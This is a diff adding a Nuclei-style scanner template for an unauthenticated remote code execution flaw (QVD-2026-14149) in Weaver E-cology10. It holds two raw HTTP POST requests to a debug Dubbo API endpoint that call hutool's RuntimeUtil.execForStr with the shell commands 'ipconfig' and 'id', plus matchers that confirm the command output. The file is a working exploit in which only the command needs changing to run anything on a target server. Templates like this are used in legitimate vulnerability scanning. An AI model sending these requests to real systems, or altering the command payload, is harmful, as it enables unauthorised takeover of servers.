@@ -1,0 +1,47 @@
+id: fanwei-ecology10-runtimeutil-RCE
+info:
+  name: "泛微E-cology10 RuntimeUtil组件远程代码执行"
+  author: 0dayPoc
+  severity: high
+  description: |-
+      泛微E-cology10 远程代码执行漏洞(QVD-2026-14149)，未经身份验证的远程攻击者可利用该漏洞向特定接口发送恶意请求，在目标服务器上执行任意代码，进而获取服务器权限。
+  reference:
+    - QVD-2026-14149
+  tags: 泛微
+
+variables:
+  randstr: "{{rand_base(8)}}"
+
+requests:
+  - raw:
+      - |
+        POST /papi/esearch/data/devops/dubboApi/debug/method?interfaceName=cn.hutool.core.util.RuntimeUtil&methodName=execForStr HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: keep-alive
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+        [["ipconfig"]]
+
+      - |
+        POST /papi/esearch/data/devops/dubboApi/debug/method?interfaceName=cn.hutool.core.util.RuntimeUtil&methodName=execForStr HTTP/1.1
+        Host: {{Hostname}}
+        Accept: */*
+        Accept-Encoding: gzip, deflate
+        Connection: keep-alive
+        Content-Type: application/json
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+
+        [["id"]]
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains_all(body,"Windows IP")'
+          - "regex('uid=([0-9(a-z)]+) gid=([0-9(a-z)]+)', body)"
+      - type: status
+        status:
+          - 200
